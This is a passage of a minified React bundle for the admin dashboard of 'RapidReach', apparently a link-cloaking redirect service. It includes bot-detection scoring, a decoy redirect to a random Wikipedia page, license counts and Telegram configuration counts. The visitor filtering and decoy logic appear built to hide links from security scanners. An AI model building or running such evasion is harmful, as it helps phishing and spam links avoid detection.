md:h-3.5"}),a.jsx("span",{className:"whitespace-nowrap",children:"ALIEN PHANTOM Engine - Invisible Transit"})]}),a.jsxs("div",{className:"flex flex-col sm:flex-row items-center justify-center gap-2 sm:gap-3 md:gap-4 mb-3 sm:mb-4",children:[a.jsxs("div",{className:"relative w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 lg:w-16 lg:h-16 flex-shrink-0",children:[a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-400/40 to-blue-500/40 rounded-full animate-pulse blur-md"}),a.jsx("div",{className:"relative z-10 w-full h-full rounded-full bg-gradient-to-br from-cyan-400/30 to-blue-500/30 backdrop-blur-sm border border-cyan-400/40 flex items-center justify-center",children:a.jsx("span",{className:"text-lg sm:text-2xl md:text-3xl lg:text-4xl font-jetbrains font-bold text-cyan-300 animate-pulse drop-shadow-lg select-none",children:""})})]}),a.jsx("h1",{className:"font-jetbrains text-2xl sm:text-3xl md:text-4xl lg:text-5xl xl:text-6xl font-black bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent tracking-wider drop-shadow-2xl text-center sm:text-left leading-tight",children:"RAPIDREACH"})]}),a.jsx("p",{className:"font-jetbrains text-blue-300/80 max-w-xs sm:max-w-md md:max-w-lg lg:max-w-2xl mx-auto font-medium tracking-wide text-xs sm:text-sm md:text-base leading-relaxed px-2",children:"Next-gen URL technology with bulletproof protection"})]}),a.jsxs("div",{className:"space-y-4 sm:space-y-6 md:space-y-8",children:[a.jsx("div",{className:"w-full animate-fade-in",style:{animationDelay:"0.1s"},children:a.jsx(E4,{})}),a.jsx("div",{className:"w-full animate-fade-in",style:{animationDelay:"0.2s"},children:a.jsx("div",{className:"bg-gradient-to-br from-slate-900/90 via-blue-900/20 to-slate-900/90 backdrop-blur-xl border border-blue-500/30 rounded-lg overflow-hidden",children:a.jsx(y4,{})})}),a.jsx("div",{className:"w-full animate-fade-in",style:{animationDelay:"0.3s"},children:a.jsx("div",{className:"bg-gradient-to-br from-slate-900/90 via-blue-900/20 to-slate-900/90 backdrop-blur-xl border border-blue-500/30 rounded-lg overflow-hidden",children:a.jsxs(wf,{defaultValue:"basic",className:"w-full",children:[a.jsxs(yc,{className:"grid w-full grid-cols-2 bg-slate-800/50 border-b border-blue-500/30",children:[a.jsxs(ar,{value:"basic",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-cyan-600 data-[state=active]:to-blue-600 font-jetbrains font-bold uppercase tracking-wider text-xs sm:text-sm",children:[a.jsx(Sn,{className:"w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),a.jsx("span",{className:"hidden xs:inline",children:"Analytics"})]}),a.jsxs(ar,{value:"scripts",className:"data-[state=active]:bg-gradient-to-r data-[state=active]:from-cyan-600 data-[state=active]:to-blue-600 font-jetbrains font-bold uppercase tracking-wider text-xs sm:text-sm",children:[a.jsx(Ai,{className:"w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2"}),a.jsx("span",{className:"hidden xs:inline",children:"Scripts"})]})]}),a.jsx(ir,{value:"basic",className:"mt-0",children:a.jsxs("div",{className:"p-4 sm:p-6 space-y-6",children:[a.jsx(I4,{}),a.jsx(P4,{})]})}),a.jsx(ir,{value:"scripts",className:"mt-0",children:a.jsx("div",{className:"p-4 sm:p-6",children:a.jsx(R4,{})})})]})})}),a.jsx("div",{className:"w-full animate-fade-in",style:{animationDelay:"0.4s"},children:a.jsx(A4,{})})]}),a.jsxs("footer",{className:"mt-8 sm:mt-12 md:mt-16 mb-4 sm:mb-6 md:mb-8 animate-fade-in",style:{animationDelay:"0.6s"},children:[a.jsxs("div",{className:"max-w-xs sm:max-w-2xl md:max-w-3xl lg:max-w-4xl xl:max-w-5xl mx-auto mb-6 sm:mb-8 px-2 sm:px-4 grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4 md:gap-6",children:[a.jsxs("div",{className:"flex items-start gap-2 sm:gap-3 group p-2 sm:p-3 rounded-lg hover:bg-blue-500/10 transition-all duration-200 touch-manipulation",children:[a.jsx("div",{className:"text-xl sm:text-2xl md:text-2xl flex-shrink-0",children:""}),a.jsxs("div",{className:"min-w-0",children:[a.jsx("h4",{className:"font-jetbrains text-sm sm:text-base font-semibold text-blue-200 leading-tight",children:"Encrypted URLs"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Secure encoding prevents tampering"})]})]}),a.jsxs("div",{className:"flex items-start gap-2 sm:gap-3 group p-2 sm:p-3 rounded-lg hover:bg-blue-500/10 transition-all duration-200 touch-manipulation",children:[a.jsx("div",{className:"text-xl sm:text-2xl md:text-2xl flex-shrink-0",children:""}),a.jsxs("div",{className:"min-w-0",children:[a.jsx("h4",{className:"font-jetbrains text-sm sm:text-base font-semibold text-blue-200 leading-tight",children:"Real-time validation"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Instant checks for link security"})]})]}),a.jsxs("div",{className:"flex items-start gap-2 sm:gap-3 group p-2 sm:p-3 rounded-lg hover:bg-blue-500/10 transition-all duration-200 touch-manipulation",children:[a.jsx("div",{className:"text-xl sm:text-2xl md:text-2xl flex-shrink-0",children:""}),a.jsxs("div",{className:"min-w-0",children:[a.jsx("h4",{className:"font-jetbrains text-sm sm:text-base font-semibold text-blue-200 leading-tight",children:"Instant generation"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Lightning-fast URL processing"})]})]}),a.jsxs("div",{className:"flex items-start gap-2 sm:gap-3 group p-2 sm:p-3 rounded-lg hover:bg-blue-500/10 transition-all duration-200 touch-manipulation",children:[a.jsx("div",{className:"text-xl sm:text-2xl md:text-2xl flex-shrink-0",children:""}),a.jsxs("div",{className:"min-w-0",children:[a.jsx("h4",{className:"font-jetbrains text-sm sm:text-base font-semibold text-blue-200 leading-tight",children:"Multi-tier protection"}),a.jsx("p",{className:"font-inter text-xs sm:text-sm text-blue-300/70 mt-0.5 sm:mt-1 leading-relaxed",children:"Defense in depth security"})]})]})]}),a.jsxs("div",{className:"border-t border-blue-400/30 pt-4 sm:pt-6",children:[a.jsx("div",{className:"text-center mb-3 sm:mb-4",children:a.jsx("p",{className:"text-xs sm:text-sm text-blue-300/50 max-w-xs sm:max-w-md md:max-w-lg mx-auto px-2 sm:px-4 font-jetbrains",children:"Intended for educational purposes and legitimate email marketing campaigns only - Any form of abuse, spam, or illegal activity is strictly prohibited"})}),a.jsxs("div",{className:"flex flex-row flex-wrap justify-center items-center gap-x-2 sm:gap-x-3 md:gap-x-4 text-xs sm:text-sm text-blue-300/60 max-w-xs sm:max-w-md md:max-w-lg mx-auto px-2 sm:px-4 text-center font-jetbrains",children:[a.jsx("span",{children:" 2025 RapidReach"}),a.jsx("span",{children:""}),a.jsx("span",{children:"Premium Email Campaign Service"})]})]})]})]})]})]})})},Z4=()=>{const t=uf();return p.useEffect(()=>{console.error("404 Error: User attempted to access non-existent route:",t.pathname)},[t.pathname]),a.jsx("div",{className:"min-h-screen flex items-center justify-center bg-background",children:a.jsxs("div",{className:"text-center",children:[a.jsx("h1",{className:"text-4xl font-bold mb-4 text-foreground",children:"404"}),a.jsx("p",{className:"text-xl text-muted-foreground mb-4",children:"Oops! Page not found"}),a.jsx("a",{href:"/",className:"text-primary hover:text-primary/80 underline",children:"Return to Home"})]})})},eC=()=>(window.location.replace("https://en.wikipedia.org/wiki/Special:Random"),null),tC=()=>{const[t,e]=p.useState(null),[r,n]=p.useState(!0),[s,i]=p.useState(!1);p.useEffect(()=>{o();const f=setInterval(o,3e4);return()=>clearInterval(f)},[]);const o=async()=>{try{i(!0);const{data:f,error:m}=await $.rpc("system_health_check");if(m)throw m;e(f)}catch(f){console.error("Error fetching health data:",f)}finally{n(!1),i(!1)}},l=()=>{if(!t)return 0;let f=100;return t.old_sessions>100&&(f-=20),t.old_visit_stats>1e3&&(f-=15),t.pending_reviews>10&&(f-=10),t.active_sessions>0&&(f+=5),t.today_visits>0&&(f+=5),Math.max(0,Math.min(100,f))},c=f=>f>=90?"text-emerald-400":f>=70?"text-amber-400":"text-red-400",d=f=>f>=90?"bg-emerald-500/20 border-emerald-400/40":f>=70?"bg-amber-500/20 border-amber-400/40":"bg-red-500/20 border-red-400/40",u=f=>f>=90?"shadow-[0_0_15px_rgba(52,211,153,0.5)]":f>=70?"shadow-[0_0_15px_rgba(251,191,36,0.5)]":"shadow-[0_0_15px_rgba(248,113,113,0.5)]";if(r)return a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(X,{className:"p-8 text-center",children:a.jsxs("div",{className:"animate-pulse flex flex-col items-center justify-center gap-3",children:[a.jsx("div",{className:"h-14 w-14 rounded-full bg-cyan-400/20 flex items-center justify-center",children:a.jsx(Rt,{className:"h-6 w-6 text-cyan-400/50 animate-spin"})}),a.jsx("div",{className:"text-cyan-200 font-jetbrains text-lg tracking-wider animate-pulse",children:"ANALYZING SYSTEM HEALTH..."})]})})]});const h=l();return a.jsxs("div",{className:"space-y-6",children:[a.jsxs(q,{className:"relative bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm overflow-hidden",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx("div",{className:"absolute inset-0 bg-gradient-to-r from-cyan-500/5 via-blue-500/5 to-purple-500/5 animate-gradient-flow pointer-events-none"}),a.jsx(fe,{className:"relative z-10 pb-2",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx(me,{className:"bg-gradient-to-r from-cyan-200 via-blue-200 to-purple-200 bg-clip-text text-transparent font-jetbrains font-bold text-xl uppercase tracking-wider",children:"SYSTEM HEALTH STATUS"}),a.jsx(bt,{className:"text-cyan-300/80 font-jetbrains tracking-wide",children:"REAL-TIME MONITORING  AUTOMATED DIAGNOSTICS"})]}),a.jsxs(W,{onClick:o,disabled:s,variant:"outline",className:"bg-slate-800/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-700/80 hover:border-cyan-300/60 font-jetbrains uppercase tracking-wider backdrop-blur-sm group",children:[a.jsx(Rt,{className:`w-4 h-4 mr-2 ${s?"animate-spin":"group-hover:animate-spin"}`}),"REFRESH"]})]})}),a.jsxs(X,{className:"relative z-10 pt-0",children:[a.jsx("div",{className:"flex items-center justify-center my-6",children:a.jsxs("div",{className:`relative w-36 h-36 rounded-full border-4 ${d(h)} flex items-center justify-center ${u(h)} transition-all duration-500 backdrop-blur-sm`,children:[a.jsx("div",{className:"absolute inset-0 rounded-full animate-pulse opacity-50",style:{background:`radial-gradient(circle, ${h>=90?"rgba(52,211,153,0.3)":h>=70?"rgba(251,191,36,0.3)":"rgba(248,113,113,0.3)"} 0%, transparent 70%)`}}),a.jsxs("div",{className:"text-center",children:[a.jsx("div",{className:`text-4xl font-bold font-jetbrains ${c(h)} animate-pulse-subtle`,children:h}),a.jsx("div",{className:"text-xs text-cyan-300/80 font-jetbrains uppercase tracking-wider mt-1",children:"HEALTH SCORE"})]})]})}),a.jsx("div",{className:"text-center mb-4",children:a.jsxs("p",{className:"text-cyan-300/80 font-jetbrains text-sm flex items-center justify-center gap-2",children:[a.jsx(cr,{className:"w-4 h-4"}),"Last Updated: ",t?new Date(t.last_updated).toLocaleString():"N/A"]})})]})]}),a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4",children:[a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm group hover:border-cyan-400/40 transition-all duration-300",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(X,{className:"p-5",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-cyan-300/80 font-jetbrains text-xs uppercase tracking-wider",children:"ACTIVE LICENSES"}),a.jsx("p",{className:"text-3xl font-bold text-cyan-200 font-jetbrains mt-1 group-hover:text-cyan-100 transition-colors",children:(t==null?void 0:t.active_licenses)||0})]}),a.jsx("div",{className:"bg-emerald-500/10 p-3 rounded-full border border-emerald-500/30 group-hover:border-emerald-400/50 transition-all duration-300",children:a.jsx(lt,{className:"w-6 h-6 text-emerald-400 group-hover:text-emerald-300 transition-colors"})})]})})]}),a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm group hover:border-cyan-400/40 transition-all duration-300",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(X,{className:"p-5",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-cyan-300/80 font-jetbrains text-xs uppercase tracking-wider",children:"ACTIVE SESSIONS"}),a.jsx("p",{className:"text-3xl font-bold text-cyan-200 font-jetbrains mt-1 group-hover:text-cyan-100 transition-colors",children:(t==null?void 0:t.active_sessions)||0})]}),a.jsx("div",{className:"bg-blue-500/10 p-3 rounded-full border border-blue-500/30 group-hover:border-blue-400/50 transition-all duration-300",children:a.jsx(Nn,{className:"w-6 h-6 text-blue-400 group-hover:text-blue-300 transition-colors"})})]})})]}),a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm group hover:border-cyan-400/40 transition-all duration-300",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(X,{className:"p-5",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-cyan-300/80 font-jetbrains text-xs uppercase tracking-wider",children:"TODAY VISITS"}),a.jsx("p",{className:"text-3xl font-bold text-cyan-200 font-jetbrains mt-1 group-hover:text-cyan-100 transition-colors",children:(t==null?void 0:t.today_visits)||0})]}),a.jsx("div",{className:"bg-yellow-500/10 p-3 rounded-full border border-yellow-500/30 group-hover:border-yellow-400/50 transition-all duration-300",children:a.jsx(Ge,{className:"w-6 h-6 text-yellow-400 group-hover:text-yellow-300 transition-colors"})})]})})]}),a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm group hover:border-cyan-400/40 transition-all duration-300",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(X,{className:"p-5",children:a.jsxs("div",{className:"flex items-center justify-between",children:[a.jsxs("div",{children:[a.jsx("p",{className:"text-cyan-300/80 font-jetbrains text-xs uppercase tracking-wider",children:"TELEGRAM CONFIGS"}),a.jsx("p",{className:"text-3xl font-bold text-cyan-200 font-jetbrains mt-1 group-hover:text-cyan-100 transition-colors",children:(t==null?void 0:t.telegram_configs)||0})]}),a.jsx("div",{className:"bg-purple-500/10 p-3 rounded-full border border-purple-500/30 group-hover:border-purple-400/50 transition-all duration-300",children:a.jsx(Bt,{className:"w-6 h-6 text-purple-400 group-hover:text-purple-300 transition-colors"})})]})})]})]}),t&&(t.old_sessions>0||t.old_visit_stats>0)&&a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-amber-950/20 to-amber-900/20 border border-amber-500/30 backdrop-blur-sm",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsx(fe,{className:"pb-2",children:a.jsxs(me,{className:"text-amber-300 font-jetbrains font-bold uppercase tracking-wider flex items-center text-lg",children:[a.jsx(ct,{className:"w-5 h-5 mr-2"}),"CLEANUP RECOMMENDATIONS"]})}),a.jsx(X,{className:"pt-0",children:a.jsxs("div",{className:"space-y-3",children:[t.old_sessions>0&&a.jsxs("div",{className:"flex items-center justify-between p-3 bg-amber-500/10 border border-amber-400/20 rounded-lg",children:[a.jsxs("span",{className:"text-amber-300 font-jetbrains text-sm",children:[t.old_sessions," old sessions detected (",">","7 days)"]}),a.jsx(W,{size:"sm",variant:"outline",className:"bg-amber-600/30 border-amber-400/40 text-amber-300 hover:bg-amber-600/50 hover:border-amber-300/60 backdrop-blur-sm font-jetbrains uppercase tracking-wider text-xs",children:"CLEANUP"})]}),t.old_visit_stats>0&&a.jsxs("div",{className:"flex items-center justify-between p-3 bg-amber-500/10 border border-amber-400/20 rounded-lg",children:[a.jsxs("span",{className:"text-amber-300 font-jetbrains text-sm",children:[t.old_visit_stats," old visit stats detected (",">","30 days)"]}),a.jsx(W,{size:"sm",variant:"outline",className:"bg-amber-600/30 border-amber-400/40 text-amber-300 hover:bg-amber-600/50 hover:border-amber-300/60 backdrop-blur-sm font-jetbrains uppercase tracking-wider text-xs",children:"CLEANUP"})]})]})})]})]})},rC=()=>{const[t,e]=p.useState({alienApiStatus:"offline",edgeFunctionStatus:"offline",localDetectionStatus:"healthy",totalDetections:0,botDetections:0,humanDetections:0}),[r,n]=p.useState(!1),s=async()=>{var c;n(!0);try{const d=Date.now(),{data:u,error:h}=await $.functions.invoke("bot-detection",{body:{ip:"127.0.0.1",userAgent:"HealthCheck/1.0",currentUrl:window.location.href,localData:{hasHumanActivity:!0,behaviorScore:0,localScore:0}}}),f=Date.now()-d;if(h)e(m=>({...m,edgeFunctionStatus:"offline",alienApiStatus:"offline"}));else{const m=(c=u==null?void 0:u.circuitBreakerStatus)!=null&&c.isOpen?"degraded":(u==null?void 0:u.alienScore)>0?"healthy":"degraded";e(g=>{var v;return{...g,edgeFunctionStatus:"healthy",alienApiStatus:m,lastEdgeFunctionCall:Date.now(),lastAlienCall:(u==null?void 0:u.alienScore)>0?Date.now():g.lastAlienCall,circuitBreakerOpen:((v=u==null?void 0:u.circuitBreakerStatus)==null?void 0:v.isOpen)||!1,apiResponseTime:f}})}}catch(d){console.error("Health check failed:",d),e(u=>({...u,edgeFunctionStatus:"offline",alienApiStatus:"offline"}))}n(!1)};p.useEffect(()=>{s();const c=setInterval(s,3e4);return()=>clearInterval(c)},[]);const i=c=>{switch(c){case"healthy":return a.jsx(Ti,{className:"w-4 h-4"});case"degraded":return a.jsx(ct,{className:"w-4 h-4"});case"offline":return a.jsx(Qh,{className:"w-4 h-4"});default:return a.jsx(Pi,{className:"w-4 h-4"})}},o=c=>{switch(c){case"healthy":return"bg-emerald-500/20 border-emerald-500/40 text-emerald-400 hover:bg-emerald-500/30";case"degraded":return"bg-amber-500/20 border-amber-500/40 text-amber-400 hover:bg-amber-500/30";case"offline":return"bg-red-500/20 border-red-500/40 text-red-400 hover:bg-red-500/30";default:return"bg-slate-500/20 border-slate-500/40 text-slate-400 hover:bg-slate-500/30"}},l=c=>{switch(c){case"healthy":return"HEALTHY";case"degraded":return"DEGRADED";case"offline":return"OFFLINE";default:return"UNKNOWN"}};return a.jsxs(q,{className:"relative overflow-hidden bg-gradient-to-br from-slate-900/90 via-blue-950/70 to-indigo-950/80 border border-cyan-500/20 backdrop-blur-sm",children:[a.jsx("div",{className:"absolute inset-0 bg-grid-slate-700/20 bg-[size:20px_20px] mask-fade-out"}),a.jsxs(fe,{className:"flex flex-row items-center justify-between space-y-0 pb-2 relative z-10",children:[a.jsx(me,{className:"text-cyan-200 font-jetbrains text-lg uppercase tracking-wider",children:"System Health"}),a.jsxs(W,{variant:"outline",size:"sm",onClick:s,disabled:r,className:"bg-slate-800/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-700/80 hover:border-cyan-300/60 font-jetbrains uppercase tracking-wider text-xs backdrop-blur-sm group",children:[a.jsx(Rt,{className:`w-4 h-4 mr-2 ${r?"animate-spin":"group-hover:animate-spin"}`}),r?"CHECKING...":"REFRESH"]})]}),a.jsxs(X,{className:"space-y-5 relative z-10",children:[a.jsxs("div",{className:"grid grid-cols-1 md:grid-cols-3 gap-4",children:[a.jsxs("div",{className:"space-y-2",children:[a.jsxs("div",{className:"flex items-center",children:[a.jsx(n_,{className:"w-4 h-4 mr-2 text-cyan-400"}),a.jsx("h4",{className:"text-sm font-medium text-cyan-200 font-jetbrains",children:"AlienAPI"})]}),a.jsxs(Se,{className:`${o(t.alienApiStatus)} border font-jetbrains text-xs py-1 px-3 flex items-center gap-1`,children:[i(t.alienApiStatus),l(t.alienApiStatus)]}),t.circuitBreakerOpen&&a.jsxs("p",{className:"text-xs text-red-400 font-jetbrains flex items-center gap-1",children:[a.jsx(Pi,{className:"w-3 h-3"})," Circuit breaker open"]}),t.lastAlienCall&&a.jsxs("p",{className:"text-xs text-cyan-400/60 font-jetbrains",children:["Last call: ",new Date(t.lastAlienCall).toLocaleTimeString()]})]}),a.jsxs("div",{className:"space-y-2",children:[a.jsxs("div",{className:"flex items-center",children:[a.jsx(wa,{className:"w-4 h-4 mr-2 text-cyan-400"}),a.jsx("h4",{className:"text-sm font-medium text-cyan-200 font-jetbrains",children:"Edge Function"})]}),a.jsxs(Se,{className:`${o(t.edgeFunctionStatus)} border font-jetbrains text-xs py-1 px-3 flex items-center gap-1`,children:[i(t.edgeFunctionStatus),l(t.edgeFunctionStatus)]}),t.apiResponseTime&&a.jsxs("p",{className:"text-xs text-cyan-400/60 font-jetbrains",children:["Response: ",t.apiResponseTime,"ms"]}),t.lastEdgeFunctionCall&&a.jsxs("p",{className:"text-xs text-cyan-400/60 font-jetbrains",children:["Last call: ",new Date(t.lastEdgeFunctionCall).toLocaleTimeString()]})]}),a.jsxs("div",{className:"space-y-2",children:[a.jsxs("div",{className:"flex items-center",children:[a.jsx(Bt,{className:"w-4 h-4 mr-2 text-cyan-400"}),a.jsx("h4",{className:"text-sm font-medium text-cyan-200 font-jetbrains",children:"Local Detection"})]}),a.jsxs(Se,{className:`${o(t.localDetectionStatus)} border font-jetbrains text-xs py-1 px-3 flex items-center gap-1`,children:[i(t.localDetectionStatus),l(t.localDetectionStatus)]}),a.jsx("p",{className:"text-xs text-cyan-400/60 font-jetbrains",children:"Fallback ready"})]})]}),a.jsxs("div",{className:"pt-4 border-t border-cyan-500/20",children:[a.jsx("h4",{className:"text-sm font-medium mb-3 text-cyan-200 font-jetbrains",children:"Performance Metrics"}),a.jsxs("div",{className:"grid grid-cols-3 gap-4 text-center",children:[a.jsxs("div",{className:"bg-slate-800/50 p-3 rounded-lg border border-cyan-500/20",children:[a.jsx("p",{className:"text-2xl font-bold text-cyan-200 font-jetbrains",children:t.totalDetections}),a.jsx("p",{className:"text-xs text-cyan-400/60 font-jetbrains uppercase tracking-wider mt-1",children:"Total Checks"})]}),a.jsxs("div",{className:"bg-slate-800/50 p-3 rounded-lg border border-red-500/20",children:[a.jsx("p",{className:"text-2xl font-bold text-red-400 font-jetbrains",children:t.botDetections}),a.jsx("p",{className:"text-xs text-red-400/60 font-jetbrains uppercase tracking-wider mt-1",children:"Bots Blocked"})]}),a.jsxs("div",{className:"bg-slate-800/50 p-3 rounded-lg border border-emerald-500/20",children:[a.jsx("p",{className:"text-2xl font-bold text-emerald-400 font-jetbrains",children:t.humanDetections}),a.jsx("p",{className:"text-xs text-emerald-400/60 font-jetbrains uppercase tracking-wider mt-1",children:"Humans Allowed"})]})]})]}),(t.alienApiStatus==="offline"||t.circuitBreakerOpen)&&a.jsxs("div",{className:"bg-amber-500/10 border border-amber-500/30 rounded-lg p-3 mt-4",children:[a.jsxs("h5",{className:"text-sm font-medium text-amber-300 mb-1 font-jetbrains flex items-center gap-2",children:[a.jsx(ct,{className:"w-4 h-4"}),"FALLBACK MODE ACTIVE"]}),a.jsx("p",{className:"text-xs text-amber-300/80 font-jetbrains",children:"System is using enhanced local detection while AlienAPI is unavailable. Security levels remain high through behavioral analysis and fingerprinting."})]})]})]})},K0=({selectedItems:t,onClearSelection:e,onBulkDelete:r,onBulkToggleStatus:n,onBulkExport:s,itemType:i})=>t.length===0?null:a.jsx("div",{className:"bg-gradient-to-r from-slate-800/90 to-blue-900/90 border border-cyan-400/30 backdrop-blur-sm rounded-lg p-4 sm:p-5 mb-6 shadow-lg",children:a.jsxs("div",{className:"flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 sm:gap-6",children:[a.jsxs("div",{className:"flex flex-col sm:flex-row items-start sm:items-center gap-3 sm:gap-5 w-full sm:w-auto",children:[a.jsxs("span",{className:"text-cyan-200 font-jetbrains font-bold text-sm sm:text-base tracking-wider",children:[t.length," ",i.toUpperCase()," SELECTED"]}),a.jsxs(W,{variant:"outline",size:"sm",onClick:e,className:"bg-slate-700/80 border-cyan-400/40 text-cyan-200 hover:bg-slate-600/80 hover:border-cyan-300/60 backdrop-blur-sm min-h-[44px] px-5 rounded-lg",title:"Clear selection",children:[a.jsx(Qh,{className:"w-4 h-4 mr-2"}),a.jsx("span",{className:"hidden xs:inline font-semibold",children:"CLEAR"})]})]}),a.jsxs("div",{className:"flex flex-wrap items-center gap-3 w-full sm:w-auto",children:[s&&a.jsxs(W,{variant:"outline",size:"sm",onClick:s,className:"bg-blue-600/30 border-blue-400/40 text-blue-300 hover:bg-blue-600/50 hover:border-blue-300/60 backdrop-blur-sm min-h-[44px] px-5 flex-1 sm:flex-initial rounded-lg",title:"Export selected items",children:[a.jsx(yl,{className:"w-4 h-4 mr-2"}),a.jsx("span",{className:"hidden xs:inline font-semibold",children:"EXPORT"})]}),n&&a.jsxs(W,{variant:"outline",size:"sm",onClick:n,className:"bg-yellow-600/30 border-yellow-400/40 text-yellow-300 hover:bg-yellow-600/50 hover:border-yellow-300/60 backdrop-blur-sm min-h-[44px] px-5 flex-1 sm:flex-initial rounded-lg",title:"Toggle status of selected items",children:[a.jsx(cu,{className:"w-4 h-4 mr-2"}),a.jsx("span",{className:"hidden xs:inline font-semibold",children:"TOGGLE"})]}),r&&a.jsxs(W,{variant:"outline",size:"sm",onClick:r,className:"bg-red-600/30 border-red-400/40 text-red-300 hover:bg-red-600/50 hover:border-red-300/60 backdrop-blur-sm min-h-[44px] px-5 flex-1 sm:flex-initial rounded-lg",title:"Delete selected items",children:[a.jsx(ta,{className:"w-4 h-4 mr-2"}),a.jsx("span",{className:"hidden xs:inline font-semibold",children:"DELETE"})]})]})]})}),nC=({children:t,className:e})=>a.jsx("div",{className:we("w-full rounded-lg border border-blue-500/30 overflow-hidden bg-slate-900/40 backdrop-blur-lg",e),children:a.jsx("div",{className:"overflow-x-auto scrollbar-hidden",children:a.jsx("table",{className:"w-full min-w-[320px] sm:min-w-[600px] lg:min-w-[800px]",children:t})})}),sC=({children:t,className:e})=>a.jsx("thead",{className:we("bg-gradient-to-r from-slate-800/90 to-blue-900/90",e),children:t}),aC=({children:t,className:e})=>a.jsx("tbody",{className:we("divide-y divide-blue-500/20",e),children:t}),iC=({children:t,className:e,mobileLayout:r})=>a.jsxs(a.Fragment,{children:[a.jsx("tr",{className:we("hidden sm:table-row hover:bg-slate-800/30 transition-colors duration-200",e),children:t}),r&&a.jsx("tr",{className:"sm:hidden",children:a.jsx("td",{colSpan:100,className:"p-0",children:a.jsx("div",{className:"bg-slate-800/40 backdrop-blur-sm border-b border-blue-500/20 p-4 space-y-3",children:r})})})]}),Dn=({children:t,className:e,label:r,priority:n="medium"})=>a.jsxs("td",{className:we("px-2 py-3 text-sm sm:px-4",n==="low"&&"hidden lg:table-cell",n==="medium"&&"hidden sm:table-cell",e),children:[r&&a.jsx("div",{className:"font-medium text-cyan-300 text-xs uppercase tracking-wider mb-1 sm:hidden",children:r}),a.jsx("div",{className:"min-w-0",children:t})]}),zn=({children:t,className:e,priority:r="medium"})=>a.jsx("th",{className:we("px-2 py-3 text-left text-xs font-bold text-cyan-200 uppercase tracking-wider sm:px-4",r==="low"&&"hidden lg:table-cell",r==="medium"&&"hidden sm:table-cell",e),children:a.jsx("div",{className:"min-w-0 truncate",children:t})});class oC{constructor(){re(this,"loggedUrls",new Set);re(this,"attemptCounts",new Map)}hasBeenLogged(e){return this.loggedUrls.has(e)}markAsLogged(e){this.loggedUrls.add(e);const r=this.attemptCounts.get(e)||0;this.attemptCounts.set(e,r+1)}getAttemptCount(e){return this.attemptCounts.get(e)||0}incrementAttempt(e){const n=(this.attemptCounts.get(e)||0)+1;return this.attemptCounts.set(e,n),n}clear(){this.loggedUrls.clear(),this.attemptCounts.clear()}getStats(){const e=this.loggedUrls.size,r=Array.from(this.attemptCounts.values()).reduce((s,i)=>s+i,0),n=Array.from(this.attemptCounts.entries()).map(([s,i])=>({hash:s.substring(0,8)+"...",attempts:i})).sort((s,i)=>i.attempts-s.attempts).slice(0,10);return{totalUniqueDeadUrls:e,totalAttempts:r,topDeadUrls:n}}}const q0=new oC,lC=()=>{const[t,e]=p.useState(null),[r,n]=p.useState([]),[s,i]=p.useState(!0),{toast:o}=Ln(),l=()=>{const u=q0.getStats();e(u)},c=async()=>{try{const{data:u,error:h}=await $.from("system_error_logs").select("*").eq("error_type","dead_url").order("created_at",{ascending:!1}).limit(10);if(h)throw h;n(u||[])}catch(u){console.error("Error loading recent blocked URL errors:",u)}},d=()=>{q0.clear(),l(),o({title:"Cache Cleared",description:"Dead URL cache has been cleared successfully."})};return p.useEffect(()=>{(async()=>{i(!0),l(),await c(),i(!1)})();const 